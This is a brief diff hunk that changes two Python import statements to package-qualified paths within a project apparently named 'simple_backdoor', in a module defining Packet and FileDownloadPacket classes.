@@ -20,8 +20,8 @@ The FileDownloadPacket class also uses Packet as base class to handle a file dow
 """
 
 import sys
-import protocol
-from utils import DataInterface
+from simple_backdoor import protocol
+from simple_backdoor.utils import DataInterface
 
 class Packet(DataInterface):
     def __init__(self, content=None, params={}, code=None):
